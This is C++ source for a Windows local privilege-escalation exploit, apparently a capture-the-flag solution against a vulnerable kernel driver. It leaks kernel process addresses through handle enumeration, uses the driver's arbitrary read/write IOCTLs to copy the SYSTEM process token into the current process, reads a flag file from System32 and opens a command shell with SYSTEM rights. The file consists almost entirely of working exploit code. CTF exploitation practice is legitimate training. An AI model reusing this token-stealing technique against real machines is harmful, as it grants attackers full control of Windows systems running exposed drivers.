#include "Header.h"

void SpawnShell();

HANDLE GetDeviceHandle(LPCSTR FileName) {
    HANDLE hFile = NULL;

    hFile = CreateFileA(FileName,
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
        NULL);

    return hFile;
}

PVOID GetEprocessByPid(DWORD pid) {

    HANDLE hProcess = NULL;

    if (pid == 4) {
        hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());
    }
    else {
        hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
        pid = GetCurrentProcessId();
    }

    // get token index
    struct
    {
        OBJECT_TYPE_INFORMATION TypeInfo;
        WCHAR TypeNameBuffer[sizeof("Process")];
    } typeInfoWithName;

    NtQueryObject(hProcess,
        ObjectTypeInformation,
        &typeInfoWithName,
        sizeof(typeInfoWithName),
        NULL);

    ULONG ddProcessIdx = typeInfoWithName.TypeInfo.TypeIndex;

    PSYSTEM_HANDLE_INFORMATION_EX handleInfo = NULL;
    DWORD infoSize = 1024 * 1024 * 2;

    handleInfo = (PSYSTEM_HANDLE_INFORMATION_EX)VirtualAlloc(NULL, infoSize, MEM_COMMIT, PAGE_READWRITE);
    PVOID pEprocess = NULL;
    NTSTATUS status = 0;

    status = NtQuerySystemInformation(SystemExtendedHandleInformation,
        handleInfo,
        infoSize,
        &infoSize);

    for (int i = 0; i < handleInfo->NumberOfHandles; ++i) {
        if (handleInfo->Handles[i].UniqueProcessId == pid &&
            handleInfo->Handles[i].HandleValue &&
            handleInfo->Handles[i].ObjectTypeIndex == ddProcessIdx
            )
        {
            pEprocess = handleInfo->Handles[i].Object;
            break;
        }
    }

    CloseHandle(hProcess);
    VirtualFree(handleInfo, infoSize, MEM_DECOMMIT);

    if (pEprocess == nullptr) {
        std::cout << "[-] _EPROCESS not founded for process with pid: " << pid << std::endl;
    }

    return pEprocess;
}

int main() {
    
    std::cout << "[!] Stage 1 - Found funcs and kernel structs" << std::endl;

    // get helpers funcs
    NtQuerySystemInformation = (pNtQuerySystemInformation)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");

    if (!NtQuerySystemInformation) {
        std::cout << "[-] Can't find symbol <NtQuerySystemInformation> in ntdll.dll" << std::endl;
        std::cout << "[!] Last error : " << GetLastError() << std::endl;
        exit(-1);
    }

    NtQueryObject = (pNtQueryObject)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryObject");

    if (!NtQueryObject) {
        std::cout << "[-] Can't find symbol <NtQuerySystemInformation> in ntdll.dll" << std::endl;
        std::cout << "[!] Last error : " << GetLastError() << std::endl;
        exit(-1);
    }

    std::cout << "[+] NtQuerySystemInformation: " << NtQuerySystemInformation << std::endl;
    std::cout << "[+] NtQueryObject: " << NtQueryObject << std::endl;

    PVOID pSystemEprocess = GetEprocessByPid(4); // PID == 4 is SYSTEM process
    PVOID pSystemToken = (PVOID)((uint8_t*)pSystemEprocess + 0x4b8); // .Token field addr

    // get current process _EPROCESS and Token addr
    PVOID pCurProcEprocess = GetEprocessByPid(GetCurrentProcessId());
    PVOID pCurProcToken = (PVOID)((uint8_t*)pCurProcEprocess + 0x4b8); // .Token field addr
    
    // get device handler 

    HANDLE hDriver = NULL;
    hDriver = GetDeviceHandle(kDeviceName);

    if (hDriver == INVALID_HANDLE_VALUE) {
        std::cout << "[-] Can't find device!" << std::endl;
        return -1;
    }

    std::cout << "[+] Device handle: " << hDriver << std::endl;

    uint8_t* pBuffer = new uint8_t[2048];

    if (pBuffer == nullptr) {
        std::cout << "[-] Can't allocate memory for trigger buffer!" << std::endl;
        return -1;
    }

    DWORD BytesReturned = 0;
    DWORD BufferSize = 2048;
    RtlFillMemory(pBuffer, 2048, 0x0);

    *(size_t*)(pBuffer + 0) = (uint64_t)0x8; // size
    *(size_t*)(pBuffer + 8) = (uint64_t)pBuffer + 0x100; // userspace buffer
    *(size_t*)(pBuffer + 16) = (uint64_t)pSystemToken; // kernelspace buffer
      
    // write - 0x220004
    // read - 0x220008
    DeviceIoControl(hDriver, 0x220004, (LPVOID)pBuffer, 2104, nullptr, 0,&BytesReturned, NULL);
   
  
    *(size_t*)(pBuffer + 0) = (uint64_t)0x8; // size
    *(size_t*)(pBuffer + 8) = (uint64_t)pBuffer + 0x100; // userspace buffer
    *(size_t*)(pBuffer + 16) = (uint64_t)pCurProcToken; // kernelspace buffer

    DeviceIoControl(hDriver, 0x220008, (LPVOID)pBuffer, 2104, nullptr, 0, &BytesReturned, NULL);

    // read flag file
    std::ifstream file;
    file.open("C:\\Windows\\System32\\flag.txt");
    std::string flag;
    file >> flag;
    std::cout << flag << std::endl;

    SpawnShell();

    return 0;
};

void SpawnShell() {
    PROCESS_INFORMATION pi;
    ZeroMemory(&pi, sizeof(pi));

    STARTUPINFO si;
    ZeroMemory(&si, sizeof(si));

    CreateProcess(L"C:\\Windows\\System32\\cmd.exe",
        NULL,
        NULL,
        NULL,
        0,
        CREATE_NEW_CONSOLE,
        NULL,
        NULL,
        &si,
        &pi);
}